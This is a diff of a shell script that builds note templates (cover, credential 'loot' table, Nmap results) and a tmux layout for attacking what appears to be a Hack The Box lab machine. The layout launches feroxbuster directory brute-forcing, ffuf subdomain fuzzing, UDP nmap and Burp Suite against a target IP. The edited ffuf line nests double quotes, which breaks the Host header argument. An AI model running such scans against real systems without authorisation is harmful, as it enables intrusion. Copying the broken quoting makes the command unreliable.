-echo ' ' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '# Path of Exploitation' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '* Foothold:' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '* User:'  >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo '* root:' >> $HOME/$BOXNAME/000\ -\ Cover.md
-echo ' ' >> $HOME/$BOXNAME/000\ -\ Cover.md
-# loot page
-echo '# Creds' >> $HOME/$BOXNAME/00\ -\ Loot.md
-echo '| Username | Password | Description |' >> $HOME/$BOXNAME/00\ -\ Loot.md
-echo '| --- | --- | -- |' >> $HOME/$BOXNAME/00\ -\ Loot.md
-echo '| | | |' >> $HOME/$BOXNAME/00\ -\ Loot.md
-# Nmap page
-echo '# Nmap' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-echo '| Port | Service | Description |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-echo '| --- | --- | --- |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-echo '| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-echo '| 80 | http | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-echo '| | | |' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-echo ' '
-echo 'Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel' >> $HOME/$BOXNAME/05\ -\ Nmap.md
-# Web enumeration page
-echo '# Web Enumeration' >> $HOME/$BOXNAME/10\ -\ Web\ Enumeration.md
+cat << 'EOF' >> "$HOME/$BOXNAME/000 - Cover.md"
+<p align="center">
+  <img  width=1024 src="" />
+</p>
 
-# View notes
-#cat $HOME/notes
-# script to setup my tmux environment
+# Path of Exploitation
+* Foothold:
+* User:
+* root:
+EOF
+
+# loot page
+cat << 'EOF' >> "$HOME/$BOXNAME/000 - Loot.md"
+# Creds
+| Username | Password | Description |
+| --- | --- | -- |
+| | | |
+EOF
+
+# Nmap page
+cat << 'EOF' >> "$HOME/$BOXNAME/05 - Nmap.md"
+# Nmap
+| Port | Service | Description |
+| --- | --- | --- |
+| 22 | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) |
+| 80 | http | |
+| | | |
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+EOF
+
+# Web enumeration page
+cat << 'EOF' >> "$HOME/$BOXNAME/10 - Web Enumeration.md"
+# Web Enumeration
+EOF
+
+# setup my tmux environment
 #                                                       ________________
 # window 0                                              |  %1  |  %2   |
 # split vertical                                        |______|_______|
 #                                                       |  %1  |  %2   |
 # then split vertical                                   |______|_______|
-cd
+cd || exit
 tmux new-session -d
 # stay in window zero
 tmux split-window -v -d
@@ -364,16 +344,16 @@ tmux split-window -h -t %1 -d
 tmux send-keys -t %1 C-l 'nmapudp' Enter
 # window 1
 tmux new-window -d
-tmux send-keys -t @1 C-l 'cd $BOXNAME;nano "10 - Web Enumeration.md"' Enter
+tmux send-keys -t @1 C-l "cd $BOXNAME;nano '10 - Web Enumeration.md'" Enter
 # window 2
 tmux new-window -d
-tmux send-keys -t @2 C-l 'feroxbuster -u http://$IP -w  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --thorough'
+tmux send-keys -t @2 C-l "feroxbuster -u http://$IP -w  /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt --thorough"
 # window 3
 tmux new-window -d
-tmux send-keys -t @3 C-l 'ffuf -u http://$IP -H "Host: FUZZ.$BOXNAME.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc all'
+tmux send-keys -t @3 C-l "ffuf -u http://$IP -H "Host: FUZZ.$BOXNAME.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -mc all"
 # window 4
 tmux new-window -d
-tmux send-keys -t @4 C-l '/home/$USER/BurpSuiteCommunity/BurpSuiteCommunity' Enter
+tmux send-keys -t @4 C-l "/home/$USER/BurpSuiteCommunity/BurpSuiteCommunity" Enter
 # window 5
 tmux new-window -d
 # Create a Vertical split
